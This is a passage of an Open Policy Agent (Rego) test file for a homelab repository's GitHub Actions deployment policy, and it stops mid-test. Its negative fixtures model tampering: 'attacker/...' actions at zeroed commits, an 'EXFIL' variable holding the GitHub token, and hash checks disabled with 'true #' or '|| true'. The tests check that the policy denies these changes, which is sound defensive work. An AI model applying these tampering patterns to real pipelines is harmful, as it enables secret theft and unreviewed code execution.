package main

import rego.v1

test_allows_exact_openclaw_startup if {
	approved_openclaw_startup with input as openclaw_startup_fixture
}

test_rejects_reusable_openclaw_startup if {
	events := object.union(openclaw_startup_fixture["true"], {"workflow_call": {}})
	candidate := object.union(openclaw_startup_fixture, {"true": events})
	violations := deny with input as candidate
	some msg in violations
	contains(msg, "OpenClaw Enterprise startup requires exact-main protected create")
}

test_rejects_openclaw_startup_run_overrides if {
	every candidate in [
		object.union(openclaw_startup_fixture, {"defaults": {"run": {"shell": "python"}}}),
		object.union(openclaw_startup_fixture, {"env": object.union(openclaw_startup_fixture.env, {"BASH_ENV": "unreviewed"})}),
		with_job_run_defaults(openclaw_startup_fixture, "startup"),
		with_job_run_env(openclaw_startup_fixture, "startup", {"BASH_ENV": "unreviewed"}),
		with_step_run_setting(openclaw_startup_fixture, "startup", 3, {"shell": "python"}),
		with_step_run_setting(openclaw_startup_fixture, "startup", 3, {"working-directory": "unreviewed"}),
		with_step_run_env(openclaw_startup_fixture, "static-policy", 3, {"ENV": "unreviewed"}),
		with_step_run_env(openclaw_startup_fixture, "startup", 3, {"BASH_ENV": "unreviewed"}),
	] {
		violations := deny with input as candidate
		some msg in violations
		contains(msg, "OpenClaw Enterprise startup requires exact-main protected create")
	}
}

test_rejects_changed_openclaw_startup if {
	job := openclaw_startup_fixture.jobs.startup
	every candidate in [
		object.union(openclaw_startup_fixture, {"concurrency": {"group": "unprotected", "cancel-in-progress": false}}),
		object.union(openclaw_startup_fixture, {"jobs": object.union(openclaw_startup_fixture.jobs, {"startup": object.union(job, {"environment": {"name": "unprotected"}})})}),
		object.union(openclaw_startup_fixture, {"jobs": object.union(openclaw_startup_fixture.jobs, {"startup": object.union(job, {"steps": [job.steps[0], job.steps[1], job.steps[2], object.union(job.steps[3], {"run": replace(openclaw_startup_private_run, "sha256sum --check --status", "true # sha256sum --check --status")})]})})}),
	] {
		not approved_openclaw_startup with input as candidate
	}
}

openclaw_startup_fixture := {
	"name": "OpenClaw Enterprise Startup Candidate",
	"permissions": {},
	"concurrency": {"group": "openclaw-enterprise-startup-production", "cancel-in-progress": false},
	"env": {"KUBE_API_SERVER_URL": "https://kubernetes-api-ci.stinkyboi.com"},
	"true": {"workflow_dispatch": {"inputs": {"expected_sha": {"required": true}}}},
	"jobs": {
		"static-policy": {"runs-on": "ubuntu-24.04", "permissions": {"contents": "read"}, "steps": [
			{"name": "Verify Dispatch Commit", "env": {"ACTUAL_REF": "${{ github.ref }}", "ACTUAL_SHA": "${{ github.sha }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}"}, "run": `test "${ACTUAL_REF}" = refs/heads/main; test "${ACTUAL_SHA}" = "${EXPECTED_SHA}"`},
			{"name": "Check Out Repository"},
			{"name": "Install Nix"},
			{"name": "Run Static Checks", "run": "nix develop --command bash scripts/ci/static-checks.sh --offline-verified"},
		]},
		"startup": {
			"needs": ["static-policy"],
			"if": "github.repository == 'Stuhlmuller/homelab' && github.ref == 'refs/heads/main'",
			"environment": {"name": "homelab-production"},
			"permissions": {"contents": "read"},
			"steps": [
				{"name": "Verify Current Main Before Credentials", "env": {"ACTUAL_REF": "${{ github.ref }}", "ACTUAL_SHA": "${{ github.sha }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "GH_REPO": "${{ github.repository }}", "GH_TOKEN": "${{ github.token }}"}, "run": openclaw_startup_main_check},
				{"name": "Check Out Repository"},
				{"name": "Install Nix"},
				{"name": "Create Or Attest Fixed Startup Secret", "env": {"EXPECTED_SHA": "${{ inputs.expected_sha }}", "OCTELIUM_AUTH_TOKEN": "${{ secrets.OCTELIUM_CI_AUTH_TOKEN }}"}, "run": openclaw_startup_private_run},
			],
		},
	},
}

test_allows_protected_platform_maintenance if {
	violations := deny with input as platform_maintenance_fixture
	count(violations) == 0
}

test_rejects_reusable_platform_maintenance if {
	events := object.union(platform_maintenance_fixture["true"], {"workflow_call": {}})
	candidate := object.union(platform_maintenance_fixture, {"true": events})
	violations := deny with input as candidate
	some msg in violations
	contains(msg, "Platform maintenance requires exact protected stages")
}

test_rejects_changed_platform_maintenance if {
	every candidate in [
		object.union(platform_maintenance_fixture, {"env": {"KUBE_API_SERVER_URL": "https://unreviewed.example.com"}}),
		object.union(platform_maintenance_fixture, {"true": {"workflow_dispatch": {"inputs": {"stage": {"options": ["inspect", "owned-cleanup"]}}}}}),
		object.union(platform_maintenance_fixture, {"jobs": object.union(platform_maintenance_fixture.jobs, {"maintenance": object.union(platform_maintenance_fixture.jobs.maintenance, {"permissions": {"contents": "write", "id-token": "write"}})})}),
		object.union(platform_maintenance_fixture, {"jobs": object.union(platform_maintenance_fixture.jobs, {"maintenance": object.union(platform_maintenance_fixture.jobs.maintenance, {"environment": {"name": "unprotected"}})})}),
		object.union(platform_maintenance_fixture, {"jobs": object.union(platform_maintenance_fixture.jobs, {"static-policy": object.union(platform_maintenance_fixture.jobs["static-policy"], {"continue-on-error": true})})}),
	] {
		violations := deny with input as candidate
		some msg in violations
		contains(msg, "Platform maintenance requires exact protected stages")
	}
}

test_rejects_missing_or_stale_main_recheck if {
	steps := platform_maintenance_fixture.jobs.maintenance.steps
	every changed in [
		{"name": "Recheck Current Main Commit Before AWS Credentials", "env": steps[3].env, "run": "true"},
		{"name": "Recheck Current Main Commit Before AWS Credentials", "env": steps[3].env, "run": `test "$ACTUAL_SHA" = "$EXPECTED_SHA"`},
	] {
		candidate_steps := [steps[0], steps[1], steps[2], changed, steps[4], steps[5]]
		candidate_job := object.union(platform_maintenance_fixture.jobs.maintenance, {"steps": candidate_steps})
		candidate := object.union(platform_maintenance_fixture, {"jobs": object.union(platform_maintenance_fixture.jobs, {"maintenance": candidate_job})})
		violations := deny with input as candidate
		some msg in violations
		contains(msg, "Platform maintenance requires exact protected stages")
	}
}

test_rejects_missing_owner_attestation if {
	steps := platform_maintenance_fixture.jobs.maintenance.steps
	changed := object.union(steps[0], {"run": replace(
		platform_maintenance_owner_main_check,
		`test "$GITHUB_ACTOR_ID" = 57728706`, "true",
	)})
	candidate_steps := [changed, steps[1], steps[2], steps[3], steps[4], steps[5]]
	candidate_job := object.union(platform_maintenance_fixture.jobs.maintenance, {"steps": candidate_steps})
	candidate := object.union(platform_maintenance_fixture, {"jobs": object.union(platform_maintenance_fixture.jobs, {"maintenance": candidate_job})})
	violations := deny with input as candidate
	some msg in violations
	contains(msg, "Platform maintenance requires exact protected stages")
}

test_rejects_unreviewed_platform_stage_helper if {
	steps := platform_maintenance_fixture.jobs.maintenance.steps
	changed := object.union(steps[5], {"run": replace(
		platform_maintenance_private_run,
		"6969b3e7bc02f203b470528dae3e1ce7e52a360312ebd9cb2b4863cee8a34312",
		"0000000000000000000000000000000000000000000000000000000000000000",
	)})
	candidate_steps := [steps[0], steps[1], steps[2], steps[3], steps[4], changed]
	candidate_job := object.union(platform_maintenance_fixture.jobs.maintenance, {"steps": candidate_steps})
	candidate := object.union(platform_maintenance_fixture, {"jobs": object.union(platform_maintenance_fixture.jobs, {"maintenance": candidate_job})})
	violations := deny with input as candidate
	some msg in violations
	contains(msg, "Platform maintenance requires exact protected stages")
}

test_rejects_bypassed_platform_static_checks if {
	static := platform_maintenance_fixture.jobs["static-policy"]
	steps := static.steps
	every candidate_steps in [
		[object.union(steps[0], {"run": "true"}), steps[1], steps[2], steps[3]],
		[steps[0], steps[1], steps[2], object.union(steps[3], {"run": "true"})],
		[steps[0], steps[1], steps[2], object.union(steps[3], {"continue-on-error": true})],
	] {
		candidate_static := object.union(static, {"steps": candidate_steps})
		candidate := object.union(platform_maintenance_fixture, {"jobs": object.union(platform_maintenance_fixture.jobs, {"static-policy": candidate_static})})
		violations := deny with input as candidate
		some msg in violations
		contains(msg, "Platform maintenance requires exact protected stages")
	}
}

test_rejects_platform_workflow_run_shell_default if {
	candidate := object.union(
		object.remove(platform_maintenance_fixture, {"permissions"}),
		{"defaults": {"run": {"shell": "bash -c 'true' --noprofile --norc {0}"}}},
	)
	violations := deny with input as candidate
	some msg in violations
	contains(msg, "Platform maintenance requires exact protected stages")
}

test_rejects_changed_platform_actions_and_credentials if {
	steps := platform_maintenance_fixture.jobs.maintenance.steps
	every candidate_steps in [
		[steps[0], object.union(steps[1], {"uses": "attacker/checkout@0000000000000000000000000000000000000000"}), steps[2], steps[3], steps[4], steps[5]],
		[steps[0], steps[1], object.union(steps[2], {"with": {"github_access_token": "${{ secrets.GITHUB_TOKEN }}", "enable_kvm": true}}), steps[3], steps[4], steps[5]],
		[steps[0], steps[1], steps[2], steps[3], object.union(steps[4], {"uses": "attacker/credentials@0000000000000000000000000000000000000000"}), steps[5]],
		[steps[0], steps[1], steps[2], object.union(steps[3], {"continue-on-error": true}), steps[4], steps[5]],
		[steps[0], steps[1], steps[2], steps[3], steps[4], object.union(steps[5], {"env": object.union(steps[5].env, {"EXFIL": "${{ secrets.GITHUB_TOKEN }}"})})],
	] {
		candidate_job := object.union(platform_maintenance_fixture.jobs.maintenance, {"steps": candidate_steps})
		candidate := object.union(platform_maintenance_fixture, {"jobs": object.union(platform_maintenance_fixture.jobs, {"maintenance": candidate_job})})
		violations := deny with input as candidate
		some msg in violations
		contains(msg, "Platform maintenance requires exact protected stages")
	}
}

platform_maintenance_fixture := {
	"name": "Platform Maintenance",
	"permissions": {},
	"env": {"KUBE_API_SERVER_URL": "https://kubernetes-api-ci.stinkyboi.com"},
	"true": {"workflow_dispatch": {"inputs": {
		"expected_sha": {"required": true},
		"stage": {"options": ["inspect", "canary-admit", "canary-release", "qualify", "ownership-capture", "ownership-approve", "owned-cleanup", "talos-1.11.6", "talos-1.12.12", "talos-1.13.11", "talos-1.14.4", "kubernetes-1.35.9"]},
		"cleanup_run_id": {"required": false, "type": "string"},
		"qualification_run_id": {},
		"evidence_source_sha": {},
		"capture_run_id": {},
		"reviewed_snapshot_sha256": {},
	}}},
	"jobs": {
		"static-policy": {"name": "Validate Platform Stage Source", "permissions": {"contents": "read"}, "runs-on": "ubuntu-24.04", "steps": [
			{"name": "Verify Dispatch Commit", "env": {"ACTUAL_REF": "${{ github.ref }}", "ACTUAL_SHA": "${{ github.sha }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "RUN_STAGE": "${{ inputs.stage }}"}, "run": platform_maintenance_dispatch_check},
			platform_maintenance_static_checkout,
			platform_maintenance_install_nix,
			{"name": "Run Static Checks", "run": platform_maintenance_static_checks},
		]},
		"maintenance": {
			"name": "Protected Platform Stage",
			"needs": ["static-policy"],
			"runs-on": "ubuntu-24.04",
			"timeout-minutes": 120,
			"environment": {"name": "homelab-production"},
			"concurrency": {"group": "platform-maintenance-production", "cancel-in-progress": false},
			"permissions": {"contents": "read", "id-token": "write"},
			"if": "github.repository == 'Stuhlmuller/homelab' && github.ref == 'refs/heads/main'",
			"steps": [
				{"name": "Verify Current Main Commit Before Credentials", "env": platform_maintenance_owner_main_check_env, "run": platform_maintenance_owner_main_check},
				platform_maintenance_private_checkout,
				platform_maintenance_install_nix,
				{"name": "Recheck Current Main Commit Before AWS Credentials", "env": platform_maintenance_main_check_env, "run": platform_maintenance_main_check},
				platform_maintenance_aws_credentials,
				{"name": "Run Reviewed Platform Stage", "env": platform_maintenance_private_env, "run": platform_maintenance_private_run},
			],
		},
	},
}

platform_maintenance_main_check_env := {"ACTUAL_REF": "${{ github.ref }}", "ACTUAL_SHA": "${{ github.sha }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "GH_REPO": "${{ github.repository }}", "GH_TOKEN": "${{ github.token }}"}
platform_maintenance_owner_main_check_env := {"ACTUAL_REF": "${{ github.ref }}", "ACTUAL_SHA": "${{ github.sha }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "RUN_STAGE": "${{ inputs.stage }}", "GH_REPO": "${{ github.repository }}", "GH_TOKEN": "${{ github.token }}"}

test_allows_exact_openclaw_legacy_operation if {
	candidate := workflow_with_openclaw_legacy_operation(
		openclaw_legacy_run,
		{"actions": "read", "contents": "read", "id-token": "write"},
	)
	violations := deny with input as candidate
	count(violations) == 0
}

test_rejects_reusable_openclaw_operations if {
	workflow := workflow_with_openclaw_legacy_operation(openclaw_legacy_run, {"actions": "read", "contents": "read", "id-token": "write"})
	events := object.union(workflow["true"], {"workflow_call": {}})
	candidate := object.union(workflow, {"true": events})
	violations := deny with input as candidate
	some msg in violations
	contains(msg, "OpenClaw Enterprise operations require exact protected stages")
}

test_rejects_openclaw_operations_run_overrides if {
	workflow := workflow_with_openclaw_legacy_operation(openclaw_legacy_run, {"actions": "read", "contents": "read", "id-token": "write"})
	every candidate in [
		object.union(workflow, {"defaults": {"run": {"shell": "python"}}}),
		object.union(workflow, {"env": object.union(workflow.env, {"BASH_ENV": "unreviewed"})}),
		with_job_run_defaults(workflow, "legacy"),
		with_job_run_defaults(workflow, "enterprise"),
		with_job_run_defaults(workflow, "binding"),
		with_job_run_env(workflow, "legacy", {"BASH_ENV": "unreviewed"}),
		with_job_run_env(workflow, "enterprise", {"ENV": "unreviewed"}),
		with_job_run_env(workflow, "binding", {"BASH_ENV": "unreviewed"}),
		with_step_run_setting(workflow, "legacy", 6, {"shell": "python"}),
		with_step_run_setting(workflow, "enterprise", 3, {"shell": "python"}),
		with_step_run_setting(workflow, "binding", 4, {"shell": "python"}),
		with_step_run_setting(workflow, "enterprise", 3, {"working-directory": "unreviewed"}),
		with_step_run_env(workflow, "static-policy", 0, {"BASH_ENV": "unreviewed"}),
		with_step_run_env(workflow, "legacy", 6, {"BASH_ENV": "unreviewed"}),
		with_step_run_env(workflow, "legacy", 6, {"UNREVIEWED": "value"}),
		with_step_run_env(workflow, "enterprise", 3, {"ENV": "unreviewed"}),
	] {
		violations := deny with input as candidate
		some msg in violations
		contains(msg, "OpenClaw Enterprise operations require exact protected stages")
	}
}

test_rejects_changed_openclaw_legacy_operation if {
	every candidate in [
		workflow_with_openclaw_legacy_operation(
			replace(openclaw_legacy_run, "a04080b2ed38ea4112605c8027b9fb17025a658dfd1f8fc38487adb726fc7611", "0000000000000000000000000000000000000000000000000000000000000000"),
			{"actions": "read", "contents": "read", "id-token": "write"},
		),
		workflow_with_openclaw_legacy_operation(
			replace(openclaw_legacy_run, "71dffb033928d510d91a252b056ce540c8a377314b44dafb2b732d6fa8822d79", "0000000000000000000000000000000000000000000000000000000000000000"),
			{"actions": "read", "contents": "read", "id-token": "write"},
		),
		workflow_with_openclaw_legacy_operation(
			replace(openclaw_legacy_run, "c32a6d36d561e9f3903193aae0bbbea0db66ee4bb19aa146be20ec55605a6708", "0000000000000000000000000000000000000000000000000000000000000000"),
			{"actions": "read", "contents": "read", "id-token": "write"},
		),
		workflow_with_openclaw_legacy_operation(openclaw_legacy_run, {"actions": "read", "contents": "write", "id-token": "write"}),
		workflow_with_openclaw_legacy_operation(replace(openclaw_legacy_run, `bash scripts/ci/openclaw-enterprise-operations.sh "$RUN_STAGE"`, `bash scripts/ci/openclaw-enterprise-operations.sh "$RUN_STAGE" || true`), {"actions": "read", "contents": "read", "id-token": "write"}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"legacy": object.union(openclaw_operations_fixture.jobs.legacy, {"concurrency": {"group": "openclaw-enterprise-operations-production", "cancel-in-progress": false, "queue": "single"}})})}),
	] {
		violations := deny with input as candidate
		some msg in violations
		contains(msg, "exact protected stages")
	}
}

test_rejects_short_openclaw_legacy_session if {
	candidate := workflow_with_openclaw_legacy_operation(openclaw_legacy_run, {"actions": "read", "contents": "read", "id-token": "write"})
	legacy := candidate.jobs.legacy
	short_credentials := object.union(legacy.steps[5], {"with": {"role-duration-seconds": 3600}})
	short_job := object.union(legacy, {"steps": [legacy.steps[0], legacy.steps[1], legacy.steps[2], legacy.steps[3], legacy.steps[4], short_credentials, legacy.steps[6]]})
	short_workflow := object.union(candidate, {"jobs": object.union(candidate.jobs, {"legacy": short_job})})
	violations := deny with input as short_workflow
	some msg in violations
	contains(msg, "exact protected stages")
}

test_rejects_changed_openclaw_enterprise_operation if {
	job := openclaw_operations_fixture.jobs.enterprise
	steps := job.steps
	static := openclaw_operations_fixture.jobs["static-policy"]
	every changed in [
		object.union(openclaw_operations_fixture, {"true": {"workflow_dispatch": {"inputs": {"enterprise_stage": {"options": ["reconcile"]}}}}}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"static-policy": object.union(static, {"steps": [object.union(static.steps[0], {"run": "true"}), static.steps[1], static.steps[2], static.steps[3]]})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"permissions": {"contents": "write"}})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"runs-on": "self-hosted"})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"concurrency": {"group": "other"}})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"concurrency": {"group": "openclaw-enterprise-operations-production", "cancel-in-progress": false, "queue": "single"}})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"steps": [steps[0], object.union(steps[1], {"with": {"fetch-depth": 1, "persist-credentials": false}}), steps[2], steps[3], steps[4]]})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"steps": [steps[0], steps[1], object.union(steps[2], {"uses": "attacker/install@0000000000000000000000000000000000000000"}), steps[3], steps[4]]})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"steps": [steps[0], steps[1], steps[2], object.union(steps[3], {"run": "true"}), steps[4]]})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"steps": [steps[0], steps[1], steps[2], steps[3], object.union(steps[4], {"env": object.union(steps[4].env, {"EXFIL": "${{ secrets.GITHUB_TOKEN }}"})})]})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"steps": [steps[0], steps[1], steps[2], steps[3], object.union(steps[4], {"run": replace(openclaw_enterprise_stage_run, "sha256sum --check --status", "true # sha256sum --check --status")})]})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"enterprise": object.union(job, {"steps": [steps[0], steps[1], steps[2], steps[3], object.union(steps[4], {"run": replace(openclaw_enterprise_stage_run, "stage.sh' &&", "stage.sh'")})]})})}),
	] {
		violations := deny with input as changed
		some msg in violations
		contains(msg, "Enterprise stages require exact dispatch")
	}
}

test_rejects_changed_openclaw_installation_binding if {
	job := openclaw_operations_fixture.jobs.binding
	steps := job.steps
	every changed in [
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"binding": object.union(job, {"environment": {"name": "unprotected"}})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"binding": object.union(job, {"runs-on": "self-hosted"})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"binding": object.union(job, {"concurrency": {"group": "other", "cancel-in-progress": false, "queue": "max"}})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"binding": object.union(job, {"steps": [steps[0], steps[1], steps[2], object.union(steps[3], {"run": "true"}), steps[4]]})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"binding": object.union(job, {"steps": [steps[0], steps[1], steps[2], steps[3], object.union(steps[4], {"run": replace(openclaw_enterprise_binding_run, "sha256sum --check --status", "true # sha256sum --check --status")})]})})}),
		object.union(openclaw_operations_fixture, {"jobs": object.union(openclaw_operations_fixture.jobs, {"binding": object.union(job, {"steps": [steps[0], steps[1], steps[2], steps[3], object.union(steps[4], {"run": replace(openclaw_enterprise_binding_run, "test -f /private/openclaw-enterprise/bootstrap/initial-admin-service-key.json", "true")})]})})}),
	] {
		violations := deny with input as changed
		some msg in violations
		contains(msg, "Enterprise stages require exact dispatch")
	}
}

test_allows_fixed_openclaw_phase_tail if {
	private_live_tail(`then
phase="$(cat "$OPENCLAW_PHASE_FILE" 2>/dev/null || true)"
case "$phase" in preflight|baseline|baseline-s3-read|baseline-mounted-compare|baseline-source-status|publication|publication-lookup|publication-lookup-denied|publication-lookup-failed|publication-lookup-response|publication-archive-result|publication-source-validation|publication-destination-absence|publication-source-size|publication-upload|publication-source-read|publication-s3-create|publication-s3-part|publication-s3-complete|publication-digest|publication-version|publication-archive-head|publication-archive-metadata|publication-receipt-upload|publication-receipt-head|publication-restore-prepare|publication-restore-archive|publication-restore-archive-source-range|publication-restore-archive-reader-transfer|publication-restore-archive-finalize|publication-restore-receipt|publication-restore-receipt-source-range|publication-restore-receipt-reader-transfer|publication-restore-receipt-finalize|verification|verification-archive-download|verification-archive-download-source-range|verification-archive-download-reader-transfer|verification-archive-download-finalize|verification-receipt-download|verification-receipt-download-source-range|verification-receipt-download-reader-transfer|verification-receipt-download-finalize|verification-restore)
  echo "::error::Legacy operation failed in ${phase}; private cluster and archive diagnostics withheld." ;;
*) echo "::error::Legacy operation failed; private cluster and archive diagnostics withheld." ;;
esac
rm -f "$OPENCLAW_RESUME_PROVENANCE"
exit 1
fi
rm -f "$OPENCLAW_RESUME_PROVENANCE"
echo "Legacy operation completed; private receipts withheld."`)
}

test_rejects_unbounded_openclaw_phase_tail if {
	not private_live_tail(`then
phase="$(cat "$OPENCLAW_PHASE_FILE")"
echo "$phase"
exit 1
fi
echo "Legacy operation completed; private receipts withheld."`)
}

openclaw_legacy_run := `set -euo pipefail
umask 077
if [[ "$RUN_STAGE" == resume-restore ]]; then
  export PRIOR_RUN_ID=39988927652
fi
export OPENCLAW_PHASE_FILE="${RUNNER_TEMP}/openclaw-phase"
sha256sum --check --status <<<'a04080b2ed38ea4112605c8027b9fb17025a658dfd1f8fc38487adb726fc7611  scripts/ci/openclaw-enterprise-operations.sh'
sha256sum --check --status <<<'71dffb033928d510d91a252b056ce540c8a377314b44dafb2b732d6fa8822d79  scripts/ci/openclaw-enterprise-upload.py'
sha256sum --check --status <<<'c32a6d36d561e9f3903193aae0bbbea0db66ee4bb19aa146be20ec55605a6708  scripts/ci/openclaw-enterprise-download.py'
bash scripts/ci/openclaw-enterprise-operations.sh "$RUN_STAGE"
`

workflow_with_openclaw_legacy_operation(run, permissions) := {
	"name": "OpenClaw Enterprise Operations",
	"permissions": {},
	"env": {"KUBE_API_SERVER_URL": "https://kubernetes-api-ci.stinkyboi.com"},
	"true": {"workflow_dispatch": {"inputs": {
		"expected_sha": {"required": true},
		"legacy_stage": {"options": ["none", "inventory", "publish-inventory", "archive", "publish-archive", "verify", "prepare-restore", "resume-restore"], "default": "none"},
		"enterprise_stage": {"options": ["none", "bind-installation", "full-sync", "reconcile", "stop", "verification", "restore", "acceptance"], "default": "none"},
		"baseline_ref": {}, "archive_ref": {},
	}}},
	"jobs": {
	"static-policy": {"permissions": {"contents": "read"}, "steps": [
		{"name": "Verify Dispatch Commit", "env": {"ACTUAL_REF": "${{ github.ref }}", "ACTUAL_SHA": "${{ github.sha }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "LEGACY_STAGE": "${{ inputs.legacy_stage }}", "ENTERPRISE_STAGE": "${{ inputs.enterprise_stage }}", "BASELINE_REF": "${{ inputs.baseline_ref }}", "ARCHIVE_REF": "${{ inputs.archive_ref }}"}, "run": openclaw_dispatch_guard},
		{"name": "Check Out Repository"},
		{"name": "Install Nix"},
		{"name": "Run Static Checks", "run": "nix develop --command bash scripts/ci/static-checks.sh --offline-verified"},
	]},
	"legacy": {
		"runs-on": "ubuntu-24.04",
		"needs": ["static-policy"],
		"environment": {"name": "homelab-production"},
		"concurrency": {"group": "openclaw-enterprise-operations-production", "cancel-in-progress": false, "queue": "max"},
		"timeout-minutes": 360,
		"permissions": permissions,
		"if": "github.repository == 'Stuhlmuller/homelab' && github.ref == 'refs/heads/main' && inputs.legacy_stage != 'none' && inputs.enterprise_stage == 'none'",
		"steps": [
			{"name": "Verify Current Main Commit Before Credentials", "env": platform_maintenance_main_check_env, "run": platform_maintenance_main_check},
			{"name": "Check Out Repository", "uses": "chainguard-actions/actions-checkout@9b08549f11b1cea64a914e482f95fa1413656505", "with": {"fetch-depth": 0, "persist-credentials": false}},
			{"name": "Install Nix", "uses": "chainguard-actions/cachix-install-nix-action@043d5ae37e81d3c6b1604becbdc6aefbdc9fa909", "with": {"enable_kvm": false, "github_access_token": "${{ secrets.GITHUB_TOKEN }}"}},
			{"name": "Verify Prior Restore Run", "env": {"RUN_STAGE": "${{ inputs.legacy_stage }}", "PRIOR_RUN_ID": "39988927652", "ARCHIVE_REF": "${{ inputs.archive_ref }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "GH_TOKEN": "${{ github.token }}"}, "run": openclaw_resume_provenance_run},
			{"name": "Verify Protected Inputs"},
			{"name": "Configure AWS Credentials", "with": {"role-duration-seconds": 25200}}, {
			"name": "Run Legacy Stage",
				"env": {"RUN_STAGE": "${{ inputs.legacy_stage }}", "BASELINE_REF": "${{ inputs.baseline_ref }}", "ARCHIVE_REF": "${{ inputs.archive_ref }}", "OPENCLAW_RESUME_PROVENANCE": "${{ runner.temp }}/oce-resume-provenance.json", "OCTELIUM_AUTH_TOKEN": "${{ secrets.OCTELIUM_CI_AUTH_TOKEN }}"},
			"run": run,
		}],
		},
	"enterprise": {
		"runs-on": "ubuntu-24.04",
		"timeout-minutes": 150,
		"needs": ["static-policy"],
		"if": "github.repository == 'Stuhlmuller/homelab' && github.ref == 'refs/heads/main' && inputs.legacy_stage == 'none' && inputs.enterprise_stage != 'none' && inputs.enterprise_stage != 'bind-installation'",
		"concurrency": {"group": "openclaw-enterprise-operations-production", "cancel-in-progress": false, "queue": "max"},
		"environment": {"name": "homelab-production"},
		"permissions": {"contents": "read"},
		"steps": [
			{"name": "Verify Current Main Commit Before Credentials", "env": {"ACTUAL_REF": "${{ github.ref }}", "ACTUAL_SHA": "${{ github.sha }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "GH_REPO": "${{ github.repository }}", "GH_TOKEN": "${{ github.token }}"}, "run": platform_maintenance_main_check},
			{"name": "Check Out Repository", "uses": "chainguard-actions/actions-checkout@9b08549f11b1cea64a914e482f95fa1413656505", "with": {"fetch-depth": 0, "persist-credentials": false}},
			{"name": "Install Nix", "uses": "chainguard-actions/cachix-install-nix-action@043d5ae37e81d3c6b1604becbdc6aefbdc9fa909", "with": {"enable_kvm": false, "github_access_token": "${{ secrets.GITHUB_TOKEN }}"}},
			{"name": "Recheck Current Main Commit Before Enterprise Stage", "env": {"ACTUAL_REF": "${{ github.ref }}", "ACTUAL_SHA": "${{ github.sha }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "GH_REPO": "${{ github.repository }}", "GH_TOKEN": "${{ github.token }}"}, "run": platform_maintenance_main_check},
			{"name": "Run Fixed Enterprise Stage", "env": {"RUN_STAGE": "${{ inputs.enterprise_stage }}", "EXPECTED_SHA": "${{ inputs.expected_sha }}", "OCTELIUM_AUTH_TOKEN": "${{ secrets.OCTELIUM_CI_AUTH_TOKEN }}", "GH_REPO": "${{ github.repository }}", "GH_TOKEN": "${{ github.token }}"}, "run": openclaw_enterprise_stage_run},
		],
	},
	"binding": {
		"runs-on": "ubuntu-24.04",
		"needs": ["static-policy"],
		"if": "github.repository == 'Stuhlmuller/homelab' && github.ref == 'refs/heads/main' && inputs.legacy_stage == 'none' && inputs.enterprise_stage == 'bind-installation'",
		"timeout-minutes": 30,
		"concurrency": {"group": "openclaw-enterprise-operations-production", "cancel-in-progress": false, "queue": "max"},
		"environment": {"name": "homelab-production"},
		"permissions": {"contents": "read"},
		"steps": [
			{"name": "Verify Current Main Commit Before Credentials", "env": platform_maintenance_main_check_env, "run": platform_maintenance_main_check},
			{"name": "Check Out Repository", "uses": "chainguard-actions/actions-checkout@9b08549f11b1cea64a914e482f95fa1413656505", "with": {"persist-credentials": false}},
			{"name": "Install Nix", "uses": "chainguard-actions/cachix-install-nix-action@043d5ae37e81d3c6b1604becbdc6aefbdc9fa909", "with": {"enable_kvm": false}},
			{"name": "Recheck Current Main Commit Before Binding", "env": platform_maintenance_main_check_env, "run": platform_maintenance_main_check},
			{"name": "Bind Reviewed Installation", "env": {"EXPECTED_SHA": "${{ inputs.expected_sha }}", "OCTELIUM_AUTH_TOKEN": "${{ secrets.OCTELIUM_CI_AUTH_TOKEN }}"}, "run": openclaw_enterprise_binding_run},
		],
	},
	},
}

openclaw_operations_fixture := workflow_with_openclaw_legacy_operation(
	openclaw_legacy_run,
	{"actions": "read", "contents": "read", "id-token": "write"},
)

test_rejects_mutable_docker_action_image if {
	violations := deny with input as workflow_with_images(
		"docker://alpine:3.21",
		"ghcr.io/example/job@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/service@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
	)
	some msg in violations
	contains(msg, "Docker action image")
}

test_rejects_mutable_job_container_image if {
	violations := deny with input as workflow_with_images(
		"docker://alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		{"image": "ghcr.io/example/job:latest"},
